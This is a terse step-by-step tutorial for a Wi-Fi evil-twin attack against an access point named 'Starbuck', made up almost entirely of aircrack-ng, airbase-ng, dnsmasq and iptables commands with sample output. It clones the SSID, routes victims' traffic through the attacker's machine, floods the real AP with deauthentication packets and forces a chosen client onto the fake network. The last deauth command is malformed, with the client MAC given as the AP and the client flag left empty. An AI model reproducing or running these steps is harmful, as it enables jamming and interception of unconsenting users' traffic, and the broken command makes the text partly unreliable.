target AP : Starbuck


**step 0 analyze the target ap get the target AP's channel**


```
sudo airmon-ng start wlan0
# set wlan0 to monitor mode 

sudo airodump-ng wlan0
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID       
 12:34:56:78:90:12  -30        3        0    0   9  360   WPA2 CCMP   PSK  Starbuck       

```

**step1 configure the evil-twin-ap**
	
```
sudo airbase-ng -e Starbuck -c 9 wlan0 & 
	# Start airbase-ng with SSID 'Starbuck' on channel 9 using wlan0 interface, run in background
	
sleep 5
 # Pause script execution for 5 seconds
	
sudo ifconfig at0 up 
# Bring up the at0 interface
	
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 
# Assign IP address 192.168.1.1 with netmask 255.255.255.0 to at0 interface
	
interface=at0
dhcp-range=192.168.1.10,192.168.1.50,12h
server=8.8.8.8
# add these lines to /etc/dnsmasq.conf to configure the dnsmasq file
	
sudo systemctl restart dnsmasq 
# Restart dnsmasq service
	
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward" 
# Enable IP forwarding
	
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 # Configure NAT to allow internet access for clients
sudo iptables -A FORWARD -i at0 -o eth0 -j ACCEPT 
# Allow forwarding packets from at0 to eth0
sudo iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT 
# Allow established connections to return from eth0 to at0
```

**step2 jam the target ap**

```
sudo aireplay-ng --deauth 10000 -a 12:34:56:78:90:12 wlan0
```

**step3 deauth the target victim**

```
sudo airodump-ng -c 9 --bssid 12:34:56:78:90:12 -w ~/wpafile1 wlan0
17:46:28  Created capture file "/home/kali/wpafile1-03.cap".

 CH  9 ][ Elapsed: 1 min ][ 2024-06-20 17:47 ][ Are you sure you                                                                                                    
                                                                                                                                                                    
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                
                                                                                                                                                                    
 12:34:56:78:90:12  -50  74      431       78    0   9  360   WPA  CCMP   PSK Starbuck                                                                                  
                                                                                                                                                                    
 BSSID              STATION            PWR   Rate    Lost    Fram s  Notes  Probes                                                                                  
                                                                                                                                                                    
 12:34:56:78:90:12  34:56:78:90:12:23  -70    6e- 1      0        1    
# choose the victim

sudo aireplay-ng --deauth 10 -a 34:56:78:90:12:23 -c  wlan0
# force the client disconnect the target ap 
```

**step4 success** 

```
finally, the client will connect to the evil twin ap "Starbuck"
```
